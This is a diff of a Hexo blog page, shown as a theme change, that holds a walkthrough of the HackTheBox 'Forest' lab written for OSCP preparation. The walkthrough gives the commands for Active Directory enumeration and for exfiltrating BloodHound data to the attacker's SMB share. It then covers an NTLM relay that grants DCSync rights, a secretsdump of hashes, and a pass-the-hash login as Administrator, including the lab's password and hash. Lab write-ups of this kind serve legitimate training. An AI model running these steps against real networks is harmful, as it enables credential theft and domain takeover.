@@ -1,22 +1,26 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
-
-
-
+<html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
-  <link rel="icon" href="/img/icon.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="So1Lupus">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="ForestBox info  Reconnmap1nmap -sT -sC -sV -O -p 53,135,139,389,445,593,3268,47001 10.10.10.161  1234567891011121314151617181920212223242526272829303132333435363738394041424344Nmap scan report for 10.">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="ForestBox info  Reconnmap1nmap -sT -sC -sV -O -p 53,135,139,389,445,593,3268,47001 10.10.10.161  1234567891011121314151617181920212223242526272829303132333435363738394041424344Nmap scan report for 10.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Road-to-OSCP-4-Forest">
 <meta property="og:url" content="http://example.com/2023/03/12/Road-to-OSCP-4-Forest/index.html">
@@ -36,254 +40,167 @@
 <meta property="article:modified_time" content="2023-03-12T14:11:13.000Z">
 <meta property="article:author" content="So1Lupus">
 <meta property="article:tag" content="OSCP备考">
-<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/2023/03/12/Road-to-OSCP-4-Forest/image-20230312205222691.png">
-  
-  
-  
-  <title>Road-to-OSCP-4-Forest - So1Lupus</title>
 
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+<link rel="canonical" href="http://example.com/2023/03/12/Road-to-OSCP-4-Forest/">
 
 
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
 
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  <title>Road-to-OSCP-4-Forest | So1Lupus</title>
   
 
 
 
 
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
 
 
-  
-<meta name="generator" content="Hexo 6.3.0"></head>
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
 
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
 
-<body>
-  
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
 
-  <header>
-    
+</head>
 
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>So1Lupus</strong>
-    </a>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
 
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
     </div>
   </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">So1Lupus</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">So1Lupus</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
 </nav>
 
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
   
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/12/Road-to-OSCP-4-Forest/">
 
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="So1Lupus">
+      <meta itemprop="description" content="So1Lupus的个人博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="So1Lupus">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Road-to-OSCP-4-Forest
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-03-12 22:02:28 / 修改时间：22:11:13" itemprop="dateCreated datePublished" datetime="2023-03-12T22:02:28+08:00">2023-03-12</time>
+            </span>
+
           
-            <span id="subtitle" data-typed-text="Road-to-OSCP-4-Forest"></span>
-          
+
         </div>
-
-        
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-03-12 22:02" pubdate>
-          2023年3月12日 晚上
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          14k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          121 分钟
-        
-      </span>
-    
+      </header>
 
     
     
-  </div>
-
-
-        
-      </div>
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">Road-to-OSCP-4-Forest</h1>
-            
-            
-              <div class="markdown-body">
-                
-                <h1 id="Forest"><a href="#Forest" class="headerlink" title="Forest"></a>Forest</h1><h2 id="Box-info"><a href="#Box-info" class="headerlink" title="Box info"></a>Box info</h2><img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312205222691.png" srcset="/img/loading.gif" lazyload class="">
+        <h1 id="Forest"><a href="#Forest" class="headerlink" title="Forest"></a>Forest</h1><h2 id="Box-info"><a href="#Box-info" class="headerlink" title="Box info"></a>Box info</h2><img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312205222691.png" class="">
 
 <h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sT -sC -sV -O -p <span class="hljs-number">53</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">389</span>,<span class="hljs-number">445</span>,<span class="hljs-number">593</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">47001</span> <span class="hljs-number">10.10.10.161</span><br></code></pre></td></tr></table></figure>
 
@@ -328,14 +245,14 @@
 
 <h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal">┌──(sollupus㉿kali)-[~<span class="hljs-regexp">/RedTeamNote/</span>Walkthrough/Forest]<br>└─<span class="hljs-variable">$ </span>evil-winrm -i <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> -u svc-alfresco<span class="hljs-variable">@HTB</span>.LOCAL<br></code></pre></td></tr></table></figure>
 
-<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312212800728.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312212800728.png" class="">
 
 <h2 id="Privesc-to-Administrator"><a href="#Privesc-to-Administrator" class="headerlink" title="Privesc to Administrator"></a>Privesc to Administrator</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><h4 id="Sharphound"><a href="#Sharphound" class="headerlink" title="Sharphound"></a>Sharphound</h4><p>With shell,we can use sharphound.exe to collect information for Bloodhound.</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&gt; upload <span class="hljs-regexp">/home/</span>sollupus<span class="hljs-regexp">/RedTeamNote/</span>WeaponizingTools<span class="hljs-regexp">/Domain-penetration/</span>Tools<span class="hljs-regexp">/Sharphood/</span>SharpHound.exe c:\tmp\sharp.exe<br></code></pre></td></tr></table></figure>
 
-<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312213156062.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312213156062.png" class="">
 
-<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312213327732.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312213327732.png" class="">
 
 <p>Then get it to local machine.I use smbserver to get that target.</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(sollupus㉿kali)-[~<span class="hljs-regexp">/…/</span>WeaponizingTools<span class="hljs-regexp">/Domain-penetration/im</span>packet/examples]<br>└─$ .<span class="hljs-regexp">/smbserver.py share /</span>home<span class="hljs-regexp">/sollupus/</span>RedTeamNote<span class="hljs-regexp">/Walkthrough/</span>Forest -smb2support -username a -password a<br></code></pre></td></tr></table></figure>
@@ -343,382 +260,220 @@
 <figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">*Evil-WinRM* PS C:<span class="hljs-string">\tmp&gt;net</span> use <span class="hljs-string">\\10.10.16.8\share</span> /u:a a<br>*Evil-WinRM* PS C:<span class="hljs-string">\tmp&gt;copy</span> <span class="hljs-number">20230312045852_</span>BloodHound.zip <span class="hljs-string">\\10.10.16.8\share\</span><br>*Evil-WinRM* PS C:<span class="hljs-string">\tmp&gt;del</span> <span class="hljs-number">20230312045852_</span>BloodHound.zip<br>*Evil-WinRM* PS C:<span class="hljs-string">\tmp&gt;net</span> use /d <span class="hljs-string">\\10.10.16.8\share</span><br></code></pre></td></tr></table></figure>
 
 <p>Then upload it to BloodHound.And use that quey to find the shortest way from owner to administrator.</p>
-<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312213915439.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312213915439.png" class="">
 
 <p>With that graph,we can know owner is belong to group <code>EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL</code>,which means that you have privilege to modify domain ACL.</p>
 <h3 id="NTLM-relay"><a href="#NTLM-relay" class="headerlink" title="NTLM-relay"></a>NTLM-relay</h3><p>1.Firstly, add <code>svc-alfresco</code> to group <code>Exchange Windows Permissions</code>.</p>
-<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312214603499.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312214603499.png" class="">
 
 
 
 <p>2.Then Run the <code>ntlmrelayx.py</code> man-in-the-middle (“mitm”) tool with the <code>--escalate-user</code> flag. What this will essentially do is when it identifies the login  attempt of the “svc-alfresco” user on the same network, it will mitm to  automatically check the user privileges, and if it can modify the domain ACL, it will modify the user permissions to add <code>Replication-Get-Changes-All</code> privileges to the user account, which can do a DCSync.</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(sollupus㉿kali)-[~<span class="hljs-regexp">/…/</span>WeaponizingTools<span class="hljs-regexp">/Domain-penetration/im</span>packet/examples]<br>└─$ .<span class="hljs-regexp">/ntlmrelayx.py -t ldap:/</span><span class="hljs-regexp">/10.10.10.161 --escalate-user svc-alfresco </span><br></code></pre></td></tr></table></figure>
 
-<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312214801416.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312214801416.png" class="">
 
 <p>3.Then, we will do a random authentication using the <code>svc-alfresco</code>  account. In this case, I used <code>psexec.py</code> to do an authenticate attempt against my own Kali box.</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(sollupus㉿kali)-[~<span class="hljs-regexp">/…/</span>WeaponizingTools<span class="hljs-regexp">/Domain-penetration/im</span>packet/examples]<br>└─$ .<span class="hljs-regexp">/psexec.py htb.local/</span>svc-alfresco:s3rvice@<span class="hljs-number">10.10</span>.<span class="hljs-number">16.8</span><br></code></pre></td></tr></table></figure>
-<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312215108184.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312215108184.png" class="">
 
 <p>​	Obviously,<code>psexec.py</code> will failed because there is no smb server runing in my kali box.However,<code>ntlmrelayx.py</code> will capture authentication attempt of the <code>htb.local/svc-alfresco</code> to the <code>ldap://10.10.10.161</code>.And since it is valid credentials to the Forces box, it will successfully authenticate and escalate our privileges to add <code>Replication-Get-Changes-All</code>.</p>
 <h3 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h3><p>Then we can use <code>secretdump.py</code> to dump the Administrator’s NTML hash.</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(sollupus㉿kali)-[~<span class="hljs-regexp">/…/</span>WeaponizingTools<span class="hljs-regexp">/Domain-penetration/im</span>packet/examples]<br>└─$ .<span class="hljs-regexp">/secretsdump.py htb.local/</span>svc-alfresco:s3rvice@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span><br></code></pre></td></tr></table></figure>
-<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312215522843.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312215522843.png" class="">
 
 <p>Then use evil-winrm ,we can connect to forest box as Administrator.</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(sollupus㉿kali)-[~<span class="hljs-regexp">/…/</span>WeaponizingTools<span class="hljs-regexp">/Domain-penetration/im</span>packet/examples]<br>└─$ evil-winrm -i <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> -u Administrator -H <span class="hljs-number">32693</span>b11e6aa90eb43d32c72a07ceea6 <br></code></pre></td></tr></table></figure>
 
 <p>And that means we get this Dc,and root.txt is in Administrator’s desktop.</p>
 
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/OSCP%E5%A4%87%E8%80%83/">#OSCP备考</a>
-      
     </div>
-  
-</div>
 
+    
+    
+    
 
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>Road-to-OSCP-4-Forest</div>
-      <div>http://example.com/2023/03/12/Road-to-OSCP-4-Forest/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>So1Lupus</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2023年3月12日</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>许可协议</div>
-          <div>
-            
-              
-              
-                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                    <i class="iconfont icon-by"></i>
-                  </span>
-                </a>
-              
-            
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/OSCP%E5%A4%87%E8%80%83/" rel="tag"># OSCP备考</a>
           </div>
-        </div>
-      
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/07/Road-to-OSCP-3-Soccer/" rel="prev" title="Road to OSCP-3 Soccer">
+      <i class="fa fa-chevron-left"></i> Road to OSCP-3 Soccer
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/03/24/CVE-2023-21839--Weblogic-%E5%A4%8D%E7%8E%B0/" rel="next" title="CVE-2023-21839--Weblogic-复现">
+      CVE-2023-21839--Weblogic-复现 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
-    <div class="license-icon iconfont"></div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
   </div>
 
+  <aside class="sidebar">
+    <div class="sidebar-inner">
 
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
 
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2023/03/24/CVE-2023-21839--Weblogic-%E5%A4%8D%E7%8E%B0/" title="CVE-2023-21839--Weblogic-复现">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CVE-2023-21839--Weblogic-复现</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2023/03/07/Road-to-OSCP-3-Soccer/" title="Road to OSCP-3 Soccer">
-                        <span class="hidden-mobile">Road to OSCP-3 Soccer</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-          </article>
-        </div>
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Forest"><span class="nav-number">1.</span> <span class="nav-text">Forest</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Box-info"><span class="nav-number">1.1.</span> <span class="nav-text">Box info</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Recon"><span class="nav-number">1.2.</span> <span class="nav-text">Recon</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap"><span class="nav-number">1.2.1.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS"><span class="nav-number">1.2.2.</span> <span class="nav-text">DNS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smb"><span class="nav-number">1.2.3.</span> <span class="nav-text">smb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RPC"><span class="nav-number">1.2.4.</span> <span class="nav-text">RPC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#enum4linux"><span class="nav-number">1.2.5.</span> <span class="nav-text">enum4linux</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shell-Gain"><span class="nav-number">1.3.</span> <span class="nav-text">Shell-Gain</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AS-REP-Roasting"><span class="nav-number">1.3.1.</span> <span class="nav-text">AS-REP Roasting</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crack-the-Hash"><span class="nav-number">1.3.2.</span> <span class="nav-text">Crack the Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell"><span class="nav-number">1.3.3.</span> <span class="nav-text">getshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privesc-to-Administrator"><span class="nav-number">1.4.</span> <span class="nav-text">Privesc to Administrator</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Enumeration"><span class="nav-number">1.4.1.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Sharphound"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">Sharphound</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-relay"><span class="nav-number">1.4.2.</span> <span class="nav-text">NTLM-relay</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DCSync"><span class="nav-number">1.4.3.</span> <span class="nav-text">DCSync</span></a></li></ol></li></ol></li></ol></div>
       </div>
-    </div>
+      <!--/noindex-->
 
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">So1Lupus</p>
+  <div class="site-description" itemprop="description">So1Lupus的个人博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
 </div>
 
 
 
+      </div>
+
+    </div>
   </aside>
+  <div id="sidebar-dimmer"></div>
 
 
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
